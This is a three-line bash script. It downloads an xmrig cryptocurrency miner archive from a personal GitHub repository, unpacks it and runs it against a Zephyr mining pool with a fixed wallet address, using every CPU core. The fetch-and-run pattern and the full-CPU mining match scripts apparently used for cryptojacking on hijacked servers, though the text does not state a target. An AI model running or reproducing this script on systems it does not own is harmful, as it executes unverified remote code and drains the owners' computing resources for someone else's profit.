#!/bin/bash
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
./xmrig --donate-level 1 -o sg.zephyr.herominers.com:1123 -u ZEPHs9wbP2kgeHU9wJoPonUwJAsZkj5rHagMgnDjK7186LuNVVfFeCGDByX2Y18AvbdRJQsNK4Fu4QM7XGs1bXegNGhthDhZ5ht -p anjay -a rx/0 -t $(nproc --all)
